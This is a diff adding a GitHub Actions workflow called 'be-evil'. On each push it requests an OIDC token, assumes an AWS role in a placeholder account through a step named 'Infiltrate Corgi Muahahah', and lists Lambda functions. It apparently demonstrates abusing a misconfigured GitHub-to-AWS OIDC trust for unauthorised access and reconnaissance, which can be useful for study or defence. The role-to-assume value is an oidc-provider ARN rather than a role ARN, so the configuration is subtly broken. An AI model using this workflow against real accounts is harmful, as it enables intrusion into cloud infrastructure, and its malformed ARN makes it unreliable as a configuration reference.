@@ -1,0 +1,17 @@
+name: be-evil
+run-name: ${{ github.actor }} is being super evil
+on: [push]
+permissions:
+  id-token: write
+jobs:
+  infiltrate:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Infiltrate Corgi Muahahah
+        uses: aws-actions/configure-aws-credentials@main
+        with:
+          role-to-assume: arn:aws:iam::${account_id}:oidc-provider/token.actions.githubusercontent.com
+          aws-region: us-east-1 
+      - name: Additional Steps...
+        run: |
+          aws lambda list-functions
